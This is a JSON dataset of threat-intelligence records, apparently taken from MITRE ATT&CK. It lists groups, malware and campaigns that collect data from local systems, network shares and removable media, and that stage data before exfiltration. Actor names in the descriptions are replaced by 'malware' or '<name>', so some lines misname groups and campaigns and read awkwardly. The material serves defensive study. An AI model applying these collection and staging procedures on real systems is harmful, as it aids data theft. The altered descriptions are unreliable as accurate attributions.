                "Description": "malware can be used to act on (ex: copy, move, etc.) files/directories in a system during (ex: copy files into a staging area before).[8]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has searched local system resources to access sensitive documents.[81]"
            },
            "S0503": {
                "ID": "S0503",
                "Name": "FrameworkPOS",
                "Description": "malware can collect elements related to credit card data from process memory.[82]"
            },
            "C0001": {
                "ID": "C0001",
                "Name": "Frankenstein",
                "Description": "During malware, the threat actors used Empire to gather various local system information.[83]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware can upload files from victims' machines.[39][84]"
            },
            "G0093": {
                "ID": "G0093",
                "Name": "GALLIUM",
                "Description": "malware collected data from the victim's local system, including password hashes from the SAM hive in the Registry.[85]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware has collected files from infected systems and uploaded them to a C2 server.[86]"
            },
            "S0666": {
                "ID": "S0666",
                "Name": "Gelsemium",
                "Description": "malware can collect data from a compromised host.[45]"
            },
            "S0477": {
                "ID": "S0477",
                "Name": "Goopy",
                "Description": "malware has the ability to exfiltrate documents from infected systems.[87]"
            },
            "S0237": {
                "ID": "S0237",
                "Name": "GravityRAT",
                "Description": "malware steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.[88]"
            },
            "S0690": {
                "ID": "S0690",
                "Name": "Green Lambert",
                "Description": "malware can collect data from a compromised host.[89]"
            },
            "S0632": {
                "ID": "S0632",
                "Name": "GrimAgent",
                "Description": "malware can collect data and files from a compromised host.[90]"
            },
            "G0125": {
                "ID": "G0125",
                "Name": "HAFNIUM",
                "Description": "malware has collected data and files from a compromised machine.[44]"
            },
            "S0009": {
                "ID": "S0009",
                "Name": "Hikit",
                "Description": "malware can upload files from compromised machines.[19]"
            },
            "S0203": {
                "ID": "S0203",
                "Name": "Hydraq",
                "Description": "malware creates a backdoor through which remote attackers can read data from files.[91][92]"
            },
            "S1022": {
                "ID": "S1022",
                "Name": "IceApple",
                "Description": "malware can collect files, passwords, and other data from a compromised host.[93]"
            },
            "G0100": {
                "ID": "G0100",
                "Name": "Inception",
                "Description": "malware used a file hunting plugin to collect .txt, .pdf, .xls or .doc files from the infected host.[94]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can collect data from the system, and can monitor changes in specified directories.[95]"
            },
            "S0015": {
                "ID": "S0015",
                "Name": "Ixeshe",
                "Description": "malware can collect data from a local system.[96]"
            },
            "S0265": {
                "ID": "S0265",
                "Name": "Kazuar",
                "Description": "malware uploads files from a specified directory to the C2 server.[97]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware gathered information and files from local directories for exfiltration.[98][99]"
            },
            "S1020": {
                "ID": "S1020",
                "Name": "Kevin",
                "Description": "malware can upload logs and other data from a compromised host.[100]"
            },
            "S0526": {
                "ID": "S0526",
                "Name": "KGH_SPY",
                "Description": "malware can send a file containing victim system information to C2.[101]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has collected Office, PDF, and HWP documents from its victims.[102][103]"
            },
            "S0250": {
                "ID": "S0250",
                "Name": "Koadic",
                "Description": "malware can download files off the target system to send back to the server.[104][105]"
            },
            "S0356": {
                "ID": "S0356",
                "Name": "KONNI",
                "Description": "malware has stored collected information and discovered processes in a tmp file.[106]"
            },
            "S1075": {
                "ID": "S1075",
                "Name": "KOPILUWAK",
                "Description": "malware can gather information from compromised hosts.[36]"
            },
            "G1004": {
                "ID": "G1004",
                "Name": "LAPSUS$",
                "Description": "malware uploaded sensitive files, information, and credentials from a targeted organization for extortion or public release.[107]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has collected data and files from compromised networks.[108][109][110][111]"
            },
            "S0395": {
                "ID": "S0395",
                "Name": "LightNeuron",
                "Description": "malware can collect files from a local system.[112]"
            },
            "S0211": {
                "ID": "S0211",
                "Name": "Linfo",
                "Description": "malware creates a backdoor through which remote attackers can obtain data from local systems.[113]"
            },
            "S1101": {
                "ID": "S1101",
                "Name": "LoFiSe",
                "Description": "malware can collect files of interest from targeted systems.[114]"
            },
            "G1014": {
                "ID": "G1014",
                "Name": "LuminousMoth",
                "Description": "malware has collected files and data from compromised machines.[115][116]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware searches the File system for files of interest.[117]"
            },
            "S1016": {
                "ID": "S1016",
                "Name": "MacMa",
                "Description": "malware can collect then exfiltrate files from the compromised system.[118]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can collect files and information from a compromised host.[119]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has used a web shell to exfiltrate a ZIP file containing a dump of LSASS memory on a compromised machine.[120][121]"
            },
            "S0652": {
                "ID": "S0652",
                "Name": "MarkiRAT",
                "Description": "malware can upload data from the victim's machine to the C2 server.[122]"
            },
            "S0500": {
                "ID": "S0500",
                "Name": "MCMD",
                "Description": "malware has the ability to upload files from an infected device.[123]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has collected various files from the compromised computers.[124][125]"
            },
            "S1059": {
                "ID": "S1059",
                "Name": "metaMain",
                "Description": "malware can collect files and system information from a compromised host.[119][126]"
            },
            "S1015": {
                "ID": "S1015",
                "Name": "Milan",
                "Description": "malware can upload files from a compromised host.[127]"
            },
            "S0084": {
                "ID": "S0084",
                "Name": "Mis-Type",
                "Description": "malware has collected files and data from a compromised host.[128]"
            },
            "S0083": {
                "ID": "S0083",
                "Name": "Misdat",
                "Description": "malware has collected files and data from a compromised host.[128]"
            },
            "S0079": {
                "ID": "S0079",
                "Name": "MobileOrder",
                "Description": "malware exfiltrates data collected from the victim mobile device.[129]"
            },
            "S1026": {
                "ID": "S1026",
                "Name": "Mongall",
                "Description": "malware has the ability to upload files from victim's machines.[130]"
            },
            "S0630": {
                "ID": "S0630",
                "Name": "Nebulae",
                "Description": "malware has the capability to upload collected files to C2.[131]"
            },
            "S0691": {
                "ID": "S0691",
                "Name": "Neoichor",
                "Description": "malware can upload files from a victim's machine.[99]"
            },
            "C0002": {
                "ID": "C0002",
                "Name": "Night Dragon",
                "Description": "During malware, the threat actors collected files and other data from compromised systems.[132]"
            },
            "S1090": {
                "ID": "S1090",
                "Name": "NightClub",
                "Description": "malware can use a file monitor to steal specific files from targeted systems.[133]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware can collect data from a local system.[134]"
            },
            "S0340": {
                "ID": "S0340",
                "Name": "Octopus",
                "Description": "malware can exfiltrate files from the system using a documents collector tool.[135]"
            },
            "C0012": {
                "ID": "C0012",
                "Name": "Operation CuckooBees",
                "Description": "During malware, the threat actors collected data, files, and other information from compromised networks.[136]"
            },
            "C0022": {
                "ID": "C0022",
                "Name": "Operation Dream Job",
                "Description": "During malware, Lazarus Group used malicious Trojans and DLL files to exfiltrate data from an infected host.[65][137]"
            },
            "C0006": {
                "ID": "C0006",
                "Name": "Operation Honeybee",
                "Description": "During malware, the threat actors collected data from compromised hosts.[138]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors exfiltrated files and directories of interest from the targeted system.[139]"
            },
            "S0352": {
                "ID": "S0352",
                "Name": "OSX_OCEANLOTUS.D",
                "Description": "malware has the ability to upload files from a compromised host.[140]"
            },
            "S0594": {
                "ID": "S0594",
                "Name": "Out1",
                "Description": "malware can copy files and Registry data from compromised hosts.[141]"
            },
            "S1017": {
                "ID": "S1017",
                "Name": "OutSteel",
                "Description": "malware can collect information from a compromised host.[142]"
            },
            "S0598": {
                "ID": "S0598",
                "Name": "P.A.S. Webshell",
                "Description": "malware has the ability to copy files on a compromised host.[143]"
            },
            "S0208": {
                "ID": "S0208",
                "Name": "Pasam",
                "Description": "malware creates a backdoor through which remote attackers can retrieve files.[144]"
            },
            "G0040": {
                "ID": "G0040",
                "Name": "Patchwork",
                "Description": "malware collected and exfiltrated files from the infected system.[145]"
            },
            "S1102": {
                "ID": "S1102",
                "Name": "Pcexter",
                "Description": "malware can upload files from targeted systems.[114]"
            },
            "S1050": {
                "ID": "S1050",
                "Name": "PcShare",
                "Description": "malware can collect files and information from a compromised host.[39]"
            },
            "S0517": {
                "ID": "S0517",
                "Name": "Pillowmint",
                "Description": "malware has collected credit card data using native API functions.[146]"
            },
            "S0048": {
                "ID": "S0048",
                "Name": "PinchDuke",
                "Description": "malware collects user files from the compromised host based on predefined file extensions.[147]"
            },
            "S1031": {
                "ID": "S1031",
                "Name": "PingPull",
                "Description": "malware can collect data from a compromised host.[148]"
            },
            "S0012": {
                "ID": "S0012",
                "Name": "PoisonIvy",
                "Description": "malware creates a backdoor through which remote attackers can steal system information.[149]"
            },
            "S1012": {
                "ID": "S1012",
                "Name": "PowerLess",
                "Description": "malware has the ability to exfiltrate data, including Chrome and Edge browser database files, from compromised machines.[150]"
            },
            "S0194": {
                "ID": "S0194",
                "Name": "PowerSploit",
                "Description": "malware contains a collection of Exfiltration modules that can access data from local files, volumes, and processes.[151][152]"
            },
            "S0223": {
                "ID": "S0223",
                "Name": "POWERSTATS",
                "Description": "malware can upload files from compromised hosts.[153]"
            },
            "S0238": {
                "ID": "S0238",
                "Name": "Proxysvc",
                "Description": "malware searches the local system and gathers data.[154]"
            },
            "S0197": {
                "ID": "S0197",
                "Name": "PUNCHTRACK",
                "Description": "malware scrapes memory for properly formatted payment card data.[155][156]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can use a variety of commands, including esentutl.exe to steal sensitive data from Internet Explorer and Microsoft Edge, to acquire information that is subsequently exfiltrated.[157][158]"
            },
            "S0262": {
                "ID": "S0262",
                "Name": "QuasarRAT",
                "Description": "malware can retrieve files from compromised client machines.[159]"
            },
            "S0686": {
                "ID": "S0686",
                "Name": "QuietSieve",
                "Description": "malware can collect files from a compromised host.[160]"
            },
            "S0629": {
                "ID": "S0629",
                "Name": "RainyDay",
                "Description": "malware can use a file exfiltration tool to collect recently changed files on a compromised host.[131]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can collect Microsoft Word documents from the target's file system, as well as .txt, .doc, and .xls files from the Internet Explorer cache.[161][162]"
            },
            "S1113": {
                "ID": "S1113",
                "Name": "RAPIDPULSE",
                "Description": "malware retrieves files from the victim system via encrypted commands sent to the web shell.[163]"
            },
            "S0169": {
                "ID": "S0169",
                "Name": "RawPOS",
                "Description": "malware dumps memory from specific processes on a victim system, parses the dumped files, and scrapes them for credit card data.[164][165][166]"
            },
            "S0662": {
                "ID": "S0662",
                "Name": "RCSession",
                "Description": "malware can collect data from a compromised host.[167][46]"
            },
            "S0448": {
                "ID": "S0448",
                "Name": "Rising Sun",
                "Description": "malware has collected data and files from a compromised host.[168]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware can collect host data and specific file types.[169][170][171]"
            },
            "S0090": {
                "ID": "S0090",
                "Name": "Rover",
                "Description": "malware searches for files on local drives based on a predefined list of file extensions.[172]"
            },
            "S1018": {
                "ID": "S1018",
                "Name": "Saint Bot",
                "Description": "malware can collect files and information from a compromised host.[173]"
            },
            "S1099": {
                "ID": "S1099",
                "Name": "Samurai",
                "Description": "malware can leverage an exfiltration module to download arbitrary files from compromised machines.[174]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has exfiltrated internal documents, files, and other data from compromised hosts.[175]"
            },
            "S1085": {
                "ID": "S1085",
                "Name": "Sardonic",
                "Description": "malware has the ability to collect data from a compromised machine to deliver to the attacker.[176]"
            },
            "S0461": {
                "ID": "S0461",
                "Name": "SDBbot",
                "Description": "malware has the ability to access the file system on a compromised host.[177]"
            },
            "S1019": {
                "ID": "S1019",
                "Name": "Shark",
                "Description": "malware can upload files to its C2.[127][178]"
            },
            "S1089": {
                "ID": "S1089",
                "Name": "SharpDisco",
                "Description": "malware has dropped a recent-files stealer plugin to C:\\Users\\Public\\WinSrcNT\\It11.exe.[133]"
            },
            "S0444": {
                "ID": "S0444",
                "Name": "ShimRat",
                "Description": "malware has the capability to upload collected files to a C2.[179]"
            },
            "S0610": {
                "ID": "S0610",
                "Name": "SideTwist",
                "Description": "malware has the ability to upload files from a compromised host.[180]"
            },
            "S1110": {
                "ID": "S1110",
                "Name": "SLIGHTPULSE",
                "Description": "malware can read files specified on the local system.[181]"
            },
            "S0533": {
                "ID": "S0533",
                "Name": "SLOTHFULMEDIA",
                "Description": "malware has uploaded files and information from victim machines.[182]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 extracted files from compromised networks.[183]"
            },
            "S0615": {
                "ID": "S0615",
                "Name": "SombRAT",
                "Description": "malware has collected data and files from a compromised host.[51][184]"
            },
            "S0646": {
                "ID": "S0646",
                "Name": "SpicyOmelette",
                "Description": "malware has collected data and other information from a compromised host.[185]"
            },
            "S1037": {
                "ID": "S1037",
                "Name": "STARWHALE",
                "Description": "malware can collect data from an infected local host.[186]"
            },
            "G0038": {
                "ID": "G0038",
                "Name": "Stealth Falcon",
                "Description": "malware malware gathers data from the local victim system.[187]"
            },
            "S1034": {
                "ID": "S1034",
                "Name": "StrifeWater",
                "Description": "malware can collect data from a compromised host.[188]"
            },
            "S0559": {
                "ID": "S0559",
                "Name": "SUNBURST",
                "Description": "malware collected information from a compromised host.[189][190]"
            },
            "S1064": {
                "ID": "S1064",
                "Name": "SVCReady",
                "Description": "malware can collect data from an infected host.[191]"
            },
            "S0663": {
                "ID": "S0663",
                "Name": "SysUpdate",
                "Description": "malware can collect information and files from a compromised host.[192]"
            },
            "S0011": {
                "ID": "S0011",
                "Name": "Taidoor",
                "Description": "malware can upload data and files from a victim's machine.[193]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to steal documents from the local system including the print spooler queue.[194]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware ran a command to compile an archive of file types of interest from the victim user's directories.[195]"
            },
            "S0665": {
                "ID": "S0665",
                "Name": "ThreatNeedle",
                "Description": "malware can collect data and files from a compromised host.[111]"
            },
            "S0668": {
                "ID": "S0668",
                "Name": "TinyTurla",
                "Description": "malware can upload files from a compromised host.[196]"
            },
            "G1022": {
                "ID": "G1022",
                "Name": "ToddyCat",
                "Description": "malware has run scripts to collect documents from targeted hosts.[114]"
            },
            "S0671": {
                "ID": "S0671",
                "Name": "Tomiris",
                "Description": "malware has the ability to collect recent files matching a hardcoded list of extensions prior to exfiltration.[197]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware collects local files and information from the victim\u2019s local machine.[198]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware RPC backdoors can upload files from victim machines.[199]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "malware can use its Get command to exfiltrate specified files from the compromised system.[200]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware has collected files from victim machines, including certificates and cookies.[201]"
            },
            "S0452": {
                "ID": "S0452",
                "Name": "USBferry",
                "Description": "malware can collect information from an air-gapped host machine.[202]"
            },
            "G1017": {
                "ID": "G1017",
                "Name": "Volt Typhoon",
                "Description": "malware has stolen the Active Directory database from targeted environments and used Wevtutil to extract event log information.[203][204]"
            },
            "S0670": {
                "ID": "S0670",
                "Name": "WarzoneRAT",
                "Description": "malware can collect data from a compromised host.[205]"
            },
            "S0515": {
                "ID": "S0515",
                "Name": "WellMail",
                "Description": "malware can exfiltrate files from the victim machine.[206]"
            },
            "S0514": {
                "ID": "S0514",
                "Name": "WellMess",
                "Description": "malware can send files from the victim machine to C2.[207][208]"
            },
            "S0645": {
                "ID": "S0645",
                "Name": "Wevtutil",
                "Description": "malware can be used to export events from a specific log.[209][210]"
            },
            "G0124": {
                "ID": "G0124",
                "Name": "Windigo",
                "Description": "malware has used a script to gather credentials in files left on disk by OpenSSH backdoors.[211]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has collected data from a compromised host prior to exfiltration.[212]"
            },
            "S1065": {
                "ID": "S1065",
                "Name": "Woody RAT",
                "Description": "malware can collect information from a compromised host.[213]"
            },
            "S0653": {
                "ID": "S0653",
                "Name": "xCaon",
                "Description": "malware has uploaded files from victims' machines.[30]"
            },
            "S0658": {
                "ID": "S0658",
                "Name": "XCSSET",
                "Description": "malware collects contacts and application data from files in Desktop, Documents, Downloads, Dropbox, and WeChat folders.[214]"
            },
            "S0248": {
                "ID": "S0248",
                "Name": "yty",
                "Description": "malware collects files with the following extensions: .ppt, .pptx, .pdf, .doc, .docx, .xls, .xlsx, .docm, .rtf, .inp, .xlsm, .csv, .odt, .pps, .vcf and sends them back to the C2 server.[215]"
            },
            "S0672": {
                "ID": "S0672",
                "Name": "Zox",
                "Description": "malware has the ability to upload files from a targeted system.[19]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware can transfer files from a compromised host.[216]"
            },
            "S1013": {
                "ID": "S1013",
                "Name": "ZxxZ",
                "Description": "malware can collect data from a compromised host.[217]"
            }
        }
    },
    "T1039": {
        "ttp_name": "Data from Network Shared Drive",
        "ttp_id": "T1039",
        "href": "/techniques/T1039",
        "tactic": "Collection",
        "description": "Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.",
        "Procedure": {
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has collected files from network shared drives.[1]"
            },
            "S0128": {
                "ID": "S0128",
                "Name": "BADNEWS",
                "Description": "When it first starts, malware crawls the victim's mapped drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.[2]"
            },
            "G0060": {
                "ID": "G0060",
                "Name": "BRONZE BUTLER",
                "Description": "malware has exfiltrated files stolen from file shares.[3]"
            },
            "C0015": {
                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors collected files from network shared drives prior to network encryption.[4]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has collected data of interest from network shares.[5]"
            },
            "S0050": {
                "ID": "S0050",
                "Name": "CosmicDuke",
                "Description": "malware steals user files from network shared drives with file extensions and keywords that match a predefined list.[6]"
            },
            "S0554": {
                "ID": "S0554",
                "Name": "Egregor",
                "Description": "malware can collect any files found in the enumerated drivers before sending it to its C2 channel.[7]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has searched network shares to access sensitive documents.[8]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware malware has collected Microsoft Office documents from mapped network drives.[9]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has collected data from remote systems by mounting network shares with net use and using Robocopy to transfer data.[10]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can collect data from network drives and stage it for exfiltration.[11]"
            },
            "G0054": {
                "ID": "G0054",
                "Name": "Sowbug",
                "Description": "malware extracted Word documents from a file server on a victim network.[12]"
            }
        }
    },
    "T1025": {
        "ttp_name": "Data from Removable Media",
        "ttp_id": "T1025",
        "href": "/techniques/T1025",
        "tactic": "Collection",
        "description": "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information. Some adversaries may also use Automated Collection on removable media.",
        "Procedure": {
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware can find and collect data from removable media devices.[1][2]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "An malware backdoor may collect the entire contents of an inserted USB device.[3]"
            },
            "S0456": {
                "ID": "S0456",
                "Name": "Aria-body",
                "Description": "malware has the ability to collect data from USB devices.[4]"
            },
            "S0128": {
                "ID": "S0128",
                "Name": "BADNEWS",
                "Description": "malware copies files with certain extensions from USB devices toa predefined directory.[5]"
            },
            "S0050": {
                "ID": "S0050",
                "Name": "CosmicDuke",
                "Description": "malware steals user files from removable media with file extensions and keywords that match a predefined list.[6]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware contains a module to collect data from removable drives.[7][8]"
            },
            "S0538": {
                "ID": "S0538",
                "Name": "Crutch",
                "Description": "malware can monitor removable drives and exfiltrate files matching a given extension list.[9]"
            },
            "S0569": {
                "ID": "S0569",
                "Name": "Explosive",
                "Description": "malware can scan all .exe files located in the USB drive.[10]"
            },
            "S0036": {
                "ID": "S0036",
                "Name": "FLASHFLOOD",
                "Description": "malware searches for interesting files (either a default or customized set of file extensions) on removable media and copies them to a staging area. The default file types copied would include data copied to the drive by SPACESHIP.[11]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "The malware FilePakMonitor component has the ability to collect files from removable devices.[12]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "A malware file stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives.[13][14]"
            },
            "S0237": {
                "ID": "S0237",
                "Name": "GravityRAT",
                "Description": "malware steals files based on an extension list if a USB drive is connected to the system.[15]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can collect jpeg files from connected MTP devices.[16]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware can find, encrypt, and upload files from fixed and removable drives.[17][18]"
            },
            "S0644": {
                "ID": "S0644",
                "Name": "ObliqueRAT",
                "Description": "malware has the ability to extract data from removable devices connected to the endpoint.[19]"
            },
            "S0113": {
                "ID": "S0113",
                "Name": "Prikormka",
                "Description": "malware contains a module that collects documents with certain extensions from removable media or fixed drives connected via USB.[20]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can collect data from removable media and stage it for exfiltration.[21]"
            },
            "S0125": {
                "ID": "S0125",
                "Name": "Remsec",
                "Description": "malware has a package that collects documents from any inserted USB sticks.[22]"
            },
            "S0090": {
                "ID": "S0090",
                "Name": "Rover",
                "Description": "malware searches for files on attached removable drives based on a predefined list of file extensions every five seconds.[23]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to steal written CD images and files of interest from previously connected removable drives when they become available again.[24]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware RPC backdoors can collect files from USB thumb drives.[25][26]"
            },
            "S0136": {
                "ID": "S0136",
                "Name": "USBStealer",
                "Description": "Once a removable media device is inserted back into the first victim, malware collects data from it that was exfiltrated from a second victim.[27][28]"
            }
        }
    },
    "T1074": {
        "ttp_name": "Data Staged",
        "ttp_id": "T1074",
        "href": "/techniques/T1074",
        "subtechnique": {
            "001": {
                "name": "Local Data Staging",
                "href": "/techniques/T1074/001",
                "description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.[1]",
                "Procedure": {
                    "S0045": {
                        "ID": "S0045",
                        "Name": "ADVSTORESHELL",
                        "Description": "<name> stores output from command execution in a .dat file in the %TEMP% directory.[2]"
                    },
                    "S0622": {
                        "ID": "S0622",
                        "Name": "AppleSeed",
                        "Description": "<name> can stage files in a central location prior to exfiltration.[3]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has stored captured credential information in a file named pi.log.[4]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has been known to stage files for exfiltration in a single location.[5]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has utilized tools to aggregate data prior to exfiltration.[6]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has staged data on compromised systems prior to exfiltration often in C:\\Users\\Public.[7]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> collects data in a plaintext file named r1.log before exfiltration. [8]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name> has staged collected data in a central upload directory prior to exfiltration.[9]"
                    },
                    "S1029": {
                        "ID": "S1029",
                        "Name": "AuTo Stealer",
                        "Description": "<name> can store collected data from an infected host to a file named Hostname_UserName.txt prior to exfiltration.[10]"
                    },
                    "G0135": {
                        "ID": "G0135",
                        "Name": "BackdoorDiplomacy",
                        "Description": "<name> has copied files of interest to the main drive's recycle bin.[11]"
                    },
                    "S0128": {
                        "ID": "S0128",
                        "Name": "BADNEWS",
                        "Description": "<name> copies documents under 15MB found on the victim system to is the user's %temp%\\SMB\\ folder. It also copies files from USB devices to a predefined directory.[12][13]"
                    },
                    "S0337": {
                        "ID": "S0337",
                        "Name": "BadPatch",
                        "Description": "<name> stores collected data in log files before exfiltration.[14]"
                    },
                    "S0651": {
                        "ID": "S0651",
                        "Name": "BoxCaon",
                        "Description": "<name> has created a working folder for collected files that it sends to the C2 server.[15]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "During <name>, PowerView's file share enumeration results were stored in the file c:\\ProgramData\\found_shares.txt.[16]"
                    },
                    "C0017": {
                        "ID": "C0017",
                        "Name": "C0017",
                        "Description": "During <name>, APT41 copied the local SAM and SYSTEM Registry hives to a staging directory.[17]"
                    },
                    "C0032": {
                        "ID": "C0032",
                        "Name": "C0032",
                        "Description": "During the <name> campaign, TEMP.Veles used staging folders that are infrequently used by legitimate users or processes to store data for exfiltration and tool deployment.[18]"
                    },
                    "S0274": {
                        "ID": "S0274",
                        "Name": "Calisto",
                        "Description": "<name> uses a hidden directory named .calisto to store data from the victim\u2019s machine before exfiltration.[19][20]"
                    },
                    "S0335": {
                        "ID": "S0335",
                        "Name": "Carbon",
                        "Description": "<name> creates a base directory that contains the files and folders that are collected.[21]"
                    },
                    "S0261": {
                        "ID": "S0261",
                        "Name": "Catchamas",
                        "Description": "<name> stores the gathered data from the machine in .db files and .bmp files under four separate locations.[22]"
                    },
                    "S1043": {
                        "ID": "S1043",
                        "Name": "ccf32",
                        "Description": "<name> can temporarily store files in a hidden directory on the local host.[23]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has staged stolen data locally on compromised hosts.[24]"
                    },
                    "S0667": {
                        "ID": "S0667",
                        "Name": "Chrommme",
                        "Description": "<name> can store captured system information locally prior to exfiltration.[25]"
                    },
                    "S0538": {
                        "ID": "S0538",
                        "Name": "Crutch",
                        "Description": "<name> has staged stolen files in the C:\\AMD\\Temp directory.[26]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> can stage local data in the Windows Registry.[1]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has created a directory named \"out\" in the user's %AppData% folder and copied files to it.[27]"
                    },
                    "S0567": {
                        "ID": "S0567",
                        "Name": "Dtrack",
                        "Description": "<name> can save collected data to disk, different file formats, and network shares.[28][29]"
                    },
                    "S0038": {
                        "ID": "S0038",
                        "Name": "Duqu",
                        "Description": "Modules can be pushed to and executed by <name> that copy data to a staging area, compress it, and XOR encrypt it.[30]"
                    },
                    "S0062": {
                        "ID": "S0062",
                        "Name": "DustySky",
                        "Description": "<name> created folders in temp directories to host collected files before exfiltration.[31]"
                    },
                    "S0024": {
                        "ID": "S0024",
                        "Name": "Dyre",
                        "Description": "<name> has the ability to create files in a TEMP folder to act as a database to store information.[32]"
                    },
                    "S0593": {
                        "ID": "S0593",
                        "Name": "ECCENTRICBANDWAGON",
                        "Description": "<name> has stored keystrokes and screenshots within the %temp%\\GoogleChrome, %temp%\\Downloads, and %temp%\\TrendMicroUpdate directories.[33]"
                    },
                    "S0081": {
                        "ID": "S0081",
                        "Name": "Elise",
                        "Description": "<name> creates a file in AppData\\Local\\Microsoft\\Windows\\Explorer and stores all harvested data in that file.[34]"
                    },
                    "S0343": {
                        "ID": "S0343",
                        "Name": "Exaramel for Windows",
                        "Description": "<name> specifies a path to store files scheduled for exfiltration.[35]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has utilized the following temporary folders on compromised Windows and Linux systems for their operations prior to exfiltration: C:\\Windows\\Temp and /tmp.[36][37]"
                    },
                    "G0053": {
                        "ID": "G0053",
                        "Name": "FIN5",
                        "Description": "<name> scripts save memory dump data into a specific directory on hosts in the victim environment.[38]"
                    },
                    "S0036": {
                        "ID": "S0036",
                        "Name": "FLASHFLOOD",
                        "Description": "<name> stages data it copies from the local system or removable drives in the \"%WINDIR%\\$NtUninstallKB885884$\\\" directory.[39]"
                    },
                    "S0503": {
                        "ID": "S0503",
                        "Name": "FrameworkPOS",
                        "Description": "<name> can identifiy payment card track data on the victim and copy it to a local file in a subdirectory of C:\\Windows.[40]"
                    },
                    "S1044": {
                        "ID": "S1044",
                        "Name": "FunnyDream",
